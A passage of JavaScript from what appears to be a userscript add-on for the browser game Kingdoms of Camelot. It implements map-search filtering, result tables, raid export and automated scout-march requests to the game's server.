		}
		document.getElementById('padivOutOpts').innerHTML = m;
		 if (t.opt.searchType == 1 || t.opt.searchType == 0) {
		document.getElementById('pafilMinLvl').addEventListener ('change', function (){
		  Options.srcMinLevel = document.getElementById('pafilMinLvl').value;
		  saveOptions();
		  t.dispMapTable ();
		  }, false);
		document.getElementById('pafilMaxLvl').addEventListener ('change', function (){
		  Options.srcMaxLevel = document.getElementById('pafilMaxLvl').value;
		  saveOptions();
		  t.dispMapTable ();
		  }, false);
		  }
		document.getElementById('pafilSortBy').addEventListener ('change', function (){
		  Options.srcSortBy = document.getElementById('pafilSortBy').value;
		  saveOptions();
		  t.dispMapTable ();
		  }, false);
		document.getElementById('pacoordsOnly').addEventListener ('change', function (){ t.dispMapTable (); }, false);
		if (t.opt.searchType == 1){
		  document.getElementById('pafilWildType').addEventListener ('change', function (){
			Options.wildType = document.getElementById('pafilWildType').value;
			saveOptions();
			t.dispMapTable ();
			}, false);
		  document.getElementById('pafilUnowned').addEventListener ('change', function (){
			Options.unownedOnly = (document.getElementById('pafilUnowned').checked);
			saveOptions();
			t.dispMapTable ();
			}, false);
		}
		if (t.opt.searchType == 2){
			document.getElementById('pafilMisted').addEventListener ('change', function (){
			Options.mistedOnly = (document.getElementById('pafilMisted').checked);
			if(!Options.mistedOnly){
				document.getElementById('pafilAll').checked = false;
				Options.srcAll = Options.mistedOnly;
			}
			saveOptions();
			t.dispMapTable ();
			}, false);
			document.getElementById('pafilHostile').addEventListener ('change', function (){
			Options.hostileOnly = (document.getElementById('pafilHostile').checked);
			if(!Options.hostileOnly){
				document.getElementById('pafilAll').checked = false;
				Options.srcAll = Options.hostileOnly;
			}
			saveOptions();
			t.dispMapTable ();
			}, false);
			document.getElementById('pafilFriendly').addEventListener ('change', function (){
			Options.friendlyOnly = (document.getElementById('pafilFriendly').checked);
			if(!Options.friendlyOnly){
				document.getElementById('pafilAll').checked = false;
				Options.srcAll = Options.friendlyOnly;
			}
			saveOptions();
			t.dispMapTable ();
			}, false);
			document.getElementById('pafilAllied').addEventListener ('change', function (){
			Options.alliedOnly = (document.getElementById('pafilAllied').checked);
			if(!Options.alliedOnly){
				document.getElementById('pafilAll').checked = false;
				Options.srcAll = Options.alliedOnly;
			}
			saveOptions();
			t.dispMapTable ();
			}, false);
			document.getElementById('pafilNeutral').addEventListener ('change', function (){
			Options.neutralOnly = (document.getElementById('pafilNeutral').checked);
			if(!Options.neutralOnly){
				document.getElementById('pafilAll').checked = false;
				Options.srcAll = Options.neutralOnly;
			}
			saveOptions();
			t.dispMapTable ();
			}, false);
			document.getElementById('pafilunAllied').addEventListener ('change', function (){
			Options.unalliedOnly = (document.getElementById('pafilunAllied').checked);
			if(!Options.unalliedOnly){
				document.getElementById('pafilAll').checked = false;
				Options.srcAll = Options.unalliedOnly;
			}
			saveOptions();
			t.dispMapTable ();
			}, false);
			document.getElementById('pafilAll').addEventListener ('change', function (){
			Options.srcAll = (document.getElementById('pafilAll').checked);
			for(i in document.getElementsByName('pbfil'))
				document.getElementsByName('pbfil')[i].checked = Options.srcAll;
			Options.mistedOnly=Options.hostileOnly=Options.friendlyOnly=Options.alliedOnly=Options.neutralOnly=Options.unalliedOnly=Options.srcAll;
			saveOptions();
			t.dispMapTable ();
			}, false);
			document.getElementById('paminmight').addEventListener ('change', function (){
			Options.minmight = parseIntNan(document.getElementById('paminmight').value);
			saveOptions();
			t.dispMapTable ();
			}, false);
		
		}
		
		document.getElementById('pbAhideShow').addEventListener ('click', t.hideShowClicked, false);
		
		t.mapDat = [];
		t.firstX =  t.opt.startX - t.opt.maxDistance;
		t.lastX = t.opt.startX + t.opt.maxDistance;
		t.firstY =  t.opt.startY - t.opt.maxDistance;
		t.lastY = t.opt.startY + t.opt.maxDistance;
		t.tilesSearched = 0;
		t.tilesFound = 0;
		t.curX = t.firstX;
		t.curY = t.firstY;
		var xxx = t.MapAjax.normalize(t.curX);
		var yyy = t.MapAjax.normalize(t.curY);
		document.getElementById ('pastatStatus').innerHTML = ''+culang.searchingnow+' '+ xxx +','+ yyy;
		setTimeout (function(){t.MapAjax.request (xxx, yyy, 15, t.eventgetplayeronline)}, MAP_DELAY);
	  },

	  hideShowClicked : function (){
		var div = document.getElementById('padivOutOpts');
		if (div.style.display == 'none'){
		  div.style.display = 'block';
		  document.getElementById('spanHideShow').innerHTML = ''+culang.spanHideShow+'';
		} else {
		  div.style.display = 'none';
		  document.getElementById('spanHideShow').innerHTML = ''+culang.spanShowHide+'';
		}
	  },
	  
	  dispMapTable : function (){
		var tileNames = [''+culang.barbarians+'', ''+culang.grassland+'', ''+culang.rptlake+'', ''+culang.forests+'', ''+culang.rpthill+'', ''+culang.rptmount+'', ''+culang.rptplain+'', null, ''+culang.darkforest+'' ];
		var t = Tabs.Search;
		var coordsOnly = document.getElementById('pacoordsOnly').checked;
		if (DEBUG_SEARCH) DebugTimer.start();
		 function mySort(a, b){
		  if (Options.srcSortBy == 'level'){
			if ((x = a[4] - b[4]) != 0)
			  return x;
		  }
		  if (Options.srcSortBy == 'might'){
			if ((x = b[10] - a[10]) != 0)
			  return x;
		  }
		  return a[2] - b[2];
		}
		
		dat = [];
		for (i=0; i<t.mapDat.length; i++){
		  lvl = parseInt (t.mapDat[i][4]);
		  type = t.mapDat[i][3];
		  if (t.opt.searchType==2 && type==7 ) {
			if(t.mapDat[i][10] >= Options.minmight || t.mapDat[i][5])
			if((Options.hostileOnly && t.mapDat[i][12] == 'h') ||
			   (Options.mistedOnly && t.mapDat[i][5]===true) ||
			   (Options.friendlyOnly && t.mapDat[i][12] == 'f') ||
			   (Options.alliedOnly && t.mapDat[i][12] == 'a') ||
			   (Options.neutralOnly && t.mapDat[i][12] == 'n') ||
			   (Options.unalliedOnly && t.mapDat[i][12] == 'u') ||
			   (Options.srcAll))
					dat.push(t.mapDat[i]);
		  } else {
		   if (lvl>=Options.srcMinLevel && lvl<=Options.srcMaxLevel){
			if (t.opt.searchType==0 || Options.wildType==0
			||  (Options.wildType==1 && (type==1 || type==2))
			||  (Options.wildType == type)){
			  if (!Options.unownedOnly || t.mapDat[i][5]===false)
				dat.push (t.mapDat[i]);
			}
		   }
		  }
		}
		if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: FILTER');
		
		//generate header
		document.getElementById('pastatFound').innerHTML = ''+culang.Hfound+': '+ dat.length;
		if (dat.length == 0){
		  m = '<BR><CENTER><b>'+culang.nofound+'</b></center>';
		} else {
		  dat.sort(mySort);
		  if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: SORT');
		  //if (coordsOnly)
		  if (document.getElementById("pacoordsOnly").checked)
			m = '<TABLE align=center id=pasrcOutTab cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>'+culang.coord+'</td></tr>';
		  else {
		  if (t.opt.searchType == 2) {
				 m = '<TABLE id=pasrcOutTab class=pbSrchResults cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>'+culang.coord+'</td><TD align=right>'+culang.distance+'</td><TD>'+culang.player+'</td><TD align=right>'+culang.might+'</td><TD>'+culang.alliance+'</td><TD>'+culang.online+'</td><TD></td></tr>';
				}
				else if (t.opt.searchType == 1)	{
				m = '<TABLE id=pasrcOutTab cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>'+culang.coord+'</td><TD style="padding-left: 10px">'+culang.distance+'</td><TD style="padding-left: 10px;">'+culang.lvl+'</td><TD width=100px> &nbsp; '+culang.type+'</td><TD></td><TD>'+culang.HeaderMiscFunctions+'</td></tr>';
				} else {				 
				m = '<TABLE id=pasrcOutTab cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>'+culang.coord+'</td><TD style="padding-left: 10px">'+culang.distance+'</td><TD style="padding-left: 10px;">'+culang.lvl+'</td><TD width=100px> &nbsp; '+culang.type+'</td><TD></td><TD>'+culang.STexpRaid+'</td></tr>';
			}
		}

		  var numRows = dat.length;
		  if (numRows > t.MAX_SHOW_WHILE_RUNNING && t.searchRunning){
			numRows = t.MAX_SHOW_WHILE_RUNNING;
			document.getElementById('pasrchSizeWarn').innerHTML = '<FONT COLOR=#600000><u>'+culang.impnote+'</u> '+culang.searchrun+' '+ t.MAX_SHOW_WHILE_RUNNING +'  '+culang.from+' '+ dat.length +' '+culang.searchrun2+'</font>';
		  }
		  for (i=0; i<numRows; i++){
			m += '<TR><TD><DIV onclick="pdxGotoMap('+ dat[i][0] +','+ dat[i][1] +')"><A>'+ dat[i][0] +','+ dat[i][1] +'</a></div></td>';
			if (document.getElementById("pacoordsOnly").checked) {
			  m += '</tr>';
			} else {
			  if (t.opt.searchType == 2) { // city search
				m += '<TD align="right" >'+ dat[i][2].toFixed(2) +'</td>';
				if (dat[i][5])
				  m += '<TD colspan=4>* '+culang.Hmist+' * &nbsp; &nbsp; <SPAN onclick="pbSearchScout('+ dat[i][0] +','+ dat[i][1] +');return false;"><A>'+culang.scout+'</a></span></td></tr>';
				else{
				  var allStyle = '';
				  if (dat[i][12]=='f')
					allStyle = 'class=pbTextFriendly';
				  else if (dat[i][12]=='h')
					allStyle = 'class=pbTextHostile';
				  m += '<TD>'+ dat[i][9]+'</td><TD align=right>'+ dat[i][10] +'</td><TD><SPAN '+ allStyle +'>'+ dat[i][11]+'</span></td><TD>'+(dat[i][13]?'<SPAN class=boldGreen>'+culang.Honline+'</span>':'')+'</td><TD><A onclick="pbSearchLookup('+ dat[i][7] +')">'+culang.show+'</a></td></tr>';
				}
				} else {
					m += '<TD align=right  valign="top">'+ dat[i][2].toFixed(2) +' &nbsp; </td><TD align=right>'+ dat[i][4] +'</td><TD> &nbsp; '+ tileNames[dat[i][3]]+'</td><TD  valign="top">'+ (dat[i][5]?(dat[i][6]!=0?' <A onclick="pbSearchLookup('+dat[i][6]+')">'+culang.Howned+'</a>':'<A onclick="pbSearchScout('+ dat[i][0] +','+ dat[i][1] +');return false;">'+culang.Hmist+'</a>'):'') +'</td>';
				  if (t.opt.searchType == 0) {
					  m+= '<TD align=center  valign="top"><A onclick="pbExportToRaid('+ dat[i][0]+','+dat[i][1] +')">'+culang.STexpRaid+'</a></td>';
				  }
				  else if (t.opt.searchType == 1) //wilderness search
				  {
					  m += '<TD align=left  valign="top"><A onclick="pbExportToCrestSearch(1,'+ dat[i][0]+','+dat[i][1] +')" title="'+culang.ToolTipCopyToWildAttack1+'">'+culang.crest+'&nbsp;1</a> <A onclick="pbExportToCrestSearch(2,'+ dat[i][0]+','+dat[i][1] +')" title="'+culang.ToolTipCopyToWildAttack2+'">'+culang.crest+'&nbsp;2</a></td>';
				  }
				  
				  m += '</tr>';
				}
			}
				
		   }
		  m += '</table>';
		}
		document.getElementById('padivOutTab').innerHTML = m;
		dat = null;
		if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: DRAW');
	  },

	  mapDat : [],

	  stopSearch : function (msg){
		var t = Tabs.Search;
		document.getElementById ('pastatStatus').innerHTML = '<FONT color=#ffaaaa>'+ msg +'</font>';
		document.getElementById ('pasrcStart').value = ''+culang.startsearch+'';
		document.getElementById ('pasrchSizeWarn').innerHTML = '';
		if (t.opt.searchType==0 && document.getElementById('KOCAttackToggle')!=null){    
		  document.getElementById ('pbSrcExp').innerHTML = '<CENTER>'+ strButton20(''+culang.expresult+'', 'id=pbSrcDoExp') +'</center>';
		  document.getElementById ('pbSrcDoExp').addEventListener ('click', t.exportKOCattack, false);
		}
		if (t.opt.searchType==2){
		  document.getElementById ('pbSrcExp').innerHTML = '<CENTER>'+ strButton20(''+culang.scoutlist+'', 'id=pbSrcDoScout') +'</center>';
		  document.getElementById ('pbSrcDoScout').addEventListener ('click', t.generateScoutList, false);
		}
		t.searchRunning = false;
		t.dispMapTable();
	  },

	  exportKOCattack : function (){
		var t = Tabs.Search;
		var bulkAdds = {};
		for (i=1; i<11; i++)
		  bulkAdds['lvl'+ i] = [];
		for (i=0; i<t.mapDat.length; i++){
		  var lvl = parseInt (t.mapDat[i][4]);
		  if (lvl>=Options.srcMinLevel && lvl<=Options.srcMaxLevel && t.mapDat[i][3]==0)
			bulkAdds['lvl'+ lvl].push({x:t.mapDat[i][0], y:t.mapDat[i][1]});
		}
		exportToKOCattack.doExport (bulkAdds, t.selectedCity);
	  },
	  
	  generateScoutList : function (){
		var t = Tabs.Search;
		var bulkScout = [];
		for (i=0; i<t.mapDat.length; i++){
		  if (t.mapDat[i][3] == 7){
			if(t.mapDat[i][10] >= Options.minmight || t.mapDat[i][5]){
			if((Options.hostileOnly && t.mapDat[i][12] == 'h') ||
			   (Options.mistedOnly && t.mapDat[i][5]===true) ||
			   (Options.friendlyOnly && t.mapDat[i][12] == 'f') ||
			   (Options.alliedOnly && t.mapDat[i][12] == 'a') ||
			   (Options.neutralOnly && t.mapDat[i][12] == 'n') ||
			   (Options.unalliedOnly && t.mapDat[i][12] == 'u') ||
			   (Options.srcAll))
				bulkScout.push({x:t.mapDat[i][0], y:t.mapDat[i][1], dist:t.mapDat[i][2]});
			}
		  }
		}
		if(t.selectedCity == null)
			t.selectedCity = Cities.cities[0];
		t.ShowScoutList (bulkScout, t.selectedCity);
	  },
	  ShowScoutList : function (coordlist, city){
		var t = Tabs.Search;
		var popScout = null;
		t.scoutcity = city;
		
		if(popScout==null){
		  popScout = new CPopup ('pbsrcscout', 0,0, 746, 100, true, function (){popScout.destroy(); popScout=null;});
		  popScout.centerMe (mainPop.getMainDiv());  
		}
		var m = '<DIV class=pdxStat>'+culang.HaScoutS+'</div>';
		m += '<DIV>'+culang.scout+' '+culang.fortroops+': <input id=pbsrcScoutAmt value="'+Options.srcScoutAmt+'" /></div><BR>';
		m += '<DIV><b>'+culang.holyplace+'</b>: <span id=pbsrcScoutcitypick> </span></div><BR>';
		m += '<DIV class=pdxStat>'+culang.from+' <span id=pbsrcScoutcity>'+city.name+'</span> <BR> '+culang.targets+': '+coordlist.length+'</div>';
		m += '<DIV style="max-height:320px; overflow-y:auto;"><TABLE align=center cellpadding=0 cellspacing=0 class=pdxTabPadNW><TR style="font-weight:bold;"><TD width=15><input type=checkbox id=pbsrcScout_All /></td><TD>'+culang.target+' '+culang.coord+'</td></tr>';
	  for(i=0; i<coordlist.length; i++){
			m += '<TR style=""><TD><input type=checkbox name=pbsrcScoutCheck id="pbsrcScoutCheck_'+coordlist[i].x+'_'+coordlist[i].y+'" value="'+coordlist[i].x+'_'+coordlist[i].y+'" /></td><TD>'+pdxkoordlink(coordlist[i].x,coordlist[i].y)+'</td></tr>';
		  }
			m += '</table></div>';
			m += '<BR><CENTER>'+ strButton20(''+culang.scouting+'', 'id=pbSrcStartScout') +'</center>';
			m += '<CENTER><DIV style="width:70%; max-height:200px; overflow-y:auto;" id=pbSrcScoutResult></DIV></center>';
		popScout.getMainDiv().innerHTML = m;
		new CdispCityPicker ('pbScoutPick', document.getElementById('pbsrcScoutcitypick'), false, function(c,x,y){document.getElementById('pbsrcScoutcity').innerHTML = c.name; t.scoutcity = c; }, city.idx);
	    popScout.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B> '+culang.scoutlist+'</b></center></div>';
		popScout.show(true);
		
		document.getElementById('pbsrcScoutAmt').addEventListener('change', function(){
			Options.srcScoutAmt = parseInt(document.getElementById('pbsrcScoutAmt').value);
			saveOptions();
		}, false);
		document.getElementById('pbsrcScout_All').addEventListener('change', function(){
			for(k in document.getElementsByName('pbsrcScoutCheck'))
				document.getElementsByName('pbsrcScoutCheck')[k].checked = document.getElementById('pbsrcScout_All').checked;
		}, false);
		document.getElementById('pbSrcStartScout').addEventListener('click', t.clickedStartScout, false);
	  },
	  scouting : false,
	  scoutcity : null,
	  doScout : function(list, city){
		var t = Tabs.Search;
		document.getElementById('pbSrcScoutResult').innerHTML = '';
		if(list.length < 1){
			document.getElementById('pbSrcScoutResult').innerHTML = '<SPAN class=boldRed>'+culang.Herror+': '+culang.errnocoord+'</span>';
			t.clickedStartScout();
			return;
		}
		if(parseInt(Seed.units['city'+city.id]['unt'+3]) < Options.srcScoutAmt){
			document.getElementById('pbSrcScoutResult').innerHTML = '<SPAN class=boldRed>'+culang.Herror+': '+culang.errnoscouts+'</span>';
			t.clickedStartScout();
			return;
		}
		t.doScoutCount(list, city, list.length, 0);
		
	  },
	  doScoutCount : function(list, city, total, count){
		var t = Tabs.Search;
		if(!t.scouting){
			document.getElementById('pbSrcScoutResult').innerHTML += '<SPAN class=boldRed>'+culang.scouting+' '+culang.canceled+'</span><BR>';
			document.getElementById('pbSrcStartScout').className = 'button20 ptButton20';
			document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>'+culang.scouting+'</span>';
			return;
		}
		if(total <= (count)){
			document.getElementById('pbSrcScoutResult').innerHTML += ''+culang.Hdone+'!<BR>';
			t.clickedStartScout();
			return;
		}
		var rallypointlevel = t.getRallypoint(city.id);
		var slots = 0;
		   for (z in Seed.queue_atkp['city'+city.id]){
				 slots++;
		   }
		if  (Seed.queue_atkp['city'+city.id].toSource() == "[]") slots=0;

		if(slots >= rallypointlevel){
			setTimeout(function(){t.doScoutCount(list, city, total, count)}, 5000);
			document.getElementById('pbSrcScoutResult').innerHTML += '<SPAN class=boldRed>'+culang.Herror+': '+culang.clearrp+'</span>';
			return;
		}
		var coords = list[count].split("_");
		if(coords[0] == 'undefined' || coords[1] == 'undefined'){
			document.getElementById('pbSrcScoutResult').innerHTML += '<SPAN class=boldRed>'+culang.Herror+': '+culang.errcoords+'</span>';
			t.clickedStartScout();
			return;
		}
		document.getElementById('pbSrcScoutResult').innerHTML += ''+culang.sendscoutsto+': '+coords[0]+','+coords[1]+' - ';
		document.getElementById('pbsrcScoutCheck_'+coords[0]+'_'+coords[1]).checked = false;
		t.sendScout(coords[0], coords[1], city, count, function(c){t.doScoutCount(list, city, total, c)});
	  },
	  sendScout : function(x, y, city, count, notify){
		var t = Tabs.Search;
		count = parseInt(count);
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.cid = city.id;
		params.kid = 0;
		params.type = 3;
		params.xcoord = x;
		params.ycoord = y;
		params.u3 = Options.srcScoutAmt;
		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
			 method: "post",
			 parameters: params,
			 loading: true,
			 onSuccess: function (rslt) {
			 rslt = eval("(" + rslt.responseText + ")");
			 if (rslt.ok) {
				 var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
				 var ut = unixTime();
				 var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
				 var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
				 for(i = 0; i <= unitsarr.length; i++){
					if(params["u"+i]){
					unitsarr[i] = params["u"+i];
					}
				 }
				 var currentcityid = params.cid;
				 unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
				 if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
				 document.getElementById('pbSrcScoutResult').innerHTML += ' '+culang.send+'!<BR>';
				 if (notify)
				  setTimeout(function(){ notify(count+1); }, 1000);
			 } else {
				 document.getElementById('pbSrcScoutResult').innerHTML += ''+culang.error+' '+culang.repeating+'....<BR>';
				 if (notify)
				  setTimeout(function(){ notify(count); }, 1000);
			  }
			},
			onFailure: function () {}
			});
	  },
	  getRallypoint: function(cityId){
		  var t = Tabs.Search;
		  cityId = 'city'+cityId;
		  for (o in Seed.buildings[cityId]){
			var buildingType = parseInt(Seed.buildings[cityId][o][0]);
			var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
			if (buildingType == 12){
				return parseInt(buildingLevel);
				break;
			}
		   }
		  return 0;
		},
		clickedStartScout : function(){
		var t = Tabs.Search;
			if(t.scouting == false){
				t.scouting = true;
				var ScoutList = [];
				for(k=0; k<document.getElementsByName('pbsrcScoutCheck').length; k++){
					if(document.getElementsByName('pbsrcScoutCheck')[k].checked){
						ScoutList.push(document.getElementsByName('pbsrcScoutCheck')[k].value);
					}
				}
				t.doScout(ScoutList, t.scoutcity);
				document.getElementById('pbSrcStartScout').className = 'button20 pbButCancel';
				document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>'+culang.cancel+'</span>';
			} else {
				t.scouting = false;
				document.getElementById('pbSrcStartScout').className = 'button20 ptButton20';
				document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>'+culang.scouting+'</span>';
			}
		},
	  mapCallback : function (uList){
		var t = Tabs.Search;

		var rslt = t.SearchList;
		map = rslt.data;
		var Dip = Seed.allianceDiplomacies;	
		var userInfo = rslt.userInfo;
		var alliance = rslt.allianceNames;
		
		for (k in map){
		  if (t.opt.searchType==0 && map[k].tileType==51 && !map[k].tileCityId ) {  // if barb
			type = 0;
		  } else if (t.opt.searchType==1 && map[k].tileType>=10 &&  map[k].tileType<=50) { // if wild
			if (map[k].tileType == 10)
			  type = 1;
			else if (map[k].tileType == 11)
			  type = 2;
			else
			  type = (map[k].tileType/10) + 1;
		  } else if (t.opt.searchType==1 && map[k].tileType==54) {
				type = 8;
		  } else if (t.opt.searchType==2 && map[k].tileCityId>=0 && map[k].tileType>50 && map[k].cityName) {
				type = 7;
		  } else
			continue;
			
		  var dist = distance (t.opt.startX, t.opt.startY, map[k].xCoord, map[k].yCoord);
		  if ((t.opt.searchShape=='circle' && dist <= t.opt.maxDistance)
		  ||  (t.opt.searchShape=='square' && map[k].xCoord>=t.firstX && map[k].xCoord<=t.lastX && map[k].yCoord>=t.firstY && map[k].yCoord<=t.lastY)){
			  if (t.opt.searchType==2) {    // if city search
					var isMisted = map[k].tileUserId == 0 || false;		
					var uu = 'u'+map[k].tileUserId;
					var aD = '';
					var nameU = '';
					var mightU = '';
					var aU = '';
					if (!isMisted && userInfo[uu]) {
						nameU = userInfo[uu].n;   // can error, must check if (userInfo[uu])
						mightU = userInfo[uu].m;
						if (alliance['a'+userInfo[uu].a])
							aU = alliance['a'+userInfo[uu].a];
						else
						  aU = '----';
						aD = '';
						if (Dip.friendly && Dip.friendly['a'+userInfo[uu].a]) aD = 'f';
						if (Dip.hostile && Dip.hostile['a'+userInfo[uu].a]) aD = 'h';
						if (Dip.allianceId && Dip.allianceId==userInfo[uu].a) aD = 'a';
						if (getDiplomacy(userInfo[uu].a) == ''+culang.neutral+'') aD = 'n';
						if (!userInfo[uu].a || userInfo[uu].a==0) aD = 'u';
						
					}
	// TODO: save memory, remove city name ?   			
			  t.mapDat.push ([map[k].xCoord, map[k].yCoord, dist, type, map[k].tileLevel, isMisted, map[k].tileCityId, map[k].tileUserId, map[k].cityName, nameU, mightU, aU, aD, uList.data[map[k].tileUserId]?1:0]);
			} else {
			  isOwned = map[k].tileUserId>0 || map[k].misted;
			  t.mapDat.push ([map[k].xCoord, map[k].yCoord, dist, type, map[k].tileLevel, isOwned, (map[k].tileUserId>0? map[k].tileUserId : 0), uList.data[map[k].tileUserId]?1:0]);
			}
			++t.tilesFound;
		  }
		}
		
		t.tilesSearched += (15*15);
		document.getElementById('pastatSearched').innerHTML = ''+culang.Hsearched+': '+ t.tilesSearched;
		t.dispMapTable();

		t.curX += 15;
		if (t.curX > t.lastX){
		  t.curX = t.firstX;
		  t.curY += 15;
		  if (t.curY > t.lastY){
			t.stopSearch (''+culang.Hdone+'!');
			return;
		  }
		}
		var x = t.MapAjax.normalize(t.curX);
		var y = t.MapAjax.normalize(t.curY);
		document.getElementById ('pastatStatus').innerHTML = ''+culang.Hsearching+' '+ x +','+ y;
		setTimeout (function(){t.MapAjax.request (x, y, 15, t.eventgetplayeronline)}, MAP_DELAY);
	  },
	  
	  eventgetplayeronline : function (left, top, width, rslt){
		var t = Tabs.Search;
		if (!t.searchRunning)
		  return;
		if (!rslt.ok){
		  t.stopSearch (''+culang.Herror+': '+ rslt.errorMsg);
		  return;
		}
		
		map = rslt.data;
		t.SearchList = rslt;
		var uList = [];
		for(k in map){
			if(map[k].tileUserId != null)
				uList.push(map[k].tileUserId);
		}
		t.fetchPlayerStatus (uList, function(r){ t.mapCallback(r)});
	  },

	  clickedScout : function (x, y){
		unsafeWindow.modal_attack (3, x, y);
		CwaitForElement ('modal_attack', 5000, function (){
		document.getElementById('modalBox1').style.zIndex='112000'
		});
	  },
		
	  clickedLookup : function (pid){
		var t = Tabs.Search;
		var pop = new CPopup ('pbsrclookup', 0,0, 746, 100, true);
		if (t.popFirst){
		  pop.centerMe (mainPop.getMainDiv());  
		  t.popFirst = false;
		}
		pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B>'+culang.player+' '+culang.profile+'</b></center></div>';
	pop.getMainDiv().innerHTML = '<DIV class=pdxStat>'+culang.HleadInfo+'</div><SPAN id=pblupLB>'+culang.STleaddata+'</span>\
	  <BR><DIV class=pdxStat>'+culang.HshowAlli+'</div><SPAN id=pblupAI>'+culang.STallydata+'</span>';
		pop.show (true);
		t.fetchLeaderboard (pid, function (r){t.gotPlayerLeaderboard(r, document.getElementById('pblupLB'))});
	t.fetchPlayerInfo (pid, function (r){t.gotPlayerInfo(r, document.getElementById('pblupAI'))});
  //t.fetchPlayerLastLogin (pid, function (r){t.gotPlayerLastLogin(r, document.getElementById('pblupLL'))});
	  },

	  ExportToRaid : function (X,Y){
		var t = Tabs.Search;
		var cityId =t.selectedCity['id'];
		var pop = new CPopup ('pbExportRaid', 0,0, 800,300, true);
		if (t.popFirst){
		  pop.centerMe (mainPop.getMainDiv());  
		  t.popFirst = false;
		}
		pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B>'+culang.shrraid+' - '+culang.add+'</b></center></div>';
		
		  var m = '<TABLE id=pbRaidAdd width=100% height=0% class=pdxTab><TR align="center">';
		  m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_1_50_s34.jpg"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt1']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt2']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt3']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt4']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit1 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit2 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit3 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit4 type=text size=6 maxlength=6 value="0"></td></tr>';
		  
		  m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt5']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt6']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt7']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt8']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit5 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit6 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit7 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit8 type=text size=6 maxlength=6 value="0"></td></tr>';
		  
		  m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt9']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt10']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt11']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt12']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit9 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit10 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit11 type=text size=6 maxlength=6 value="0"></td>';
		  m += '<TD><INPUT id=Unit12 type=text size=6 maxlength=6 value="0"></td></tr></table>';
		  
		  m += '<BR><CENTER>' +strButton20(''+culang.helpbutton+'', 'id=pbHelp')+'<SELECT id=RaidKnights type=list></select></center>';
		  m+= '<BR><CENTER>'+ strButton20(''+culang.acksave+'', 'id=pbRaidSave') +'</center>';
			  
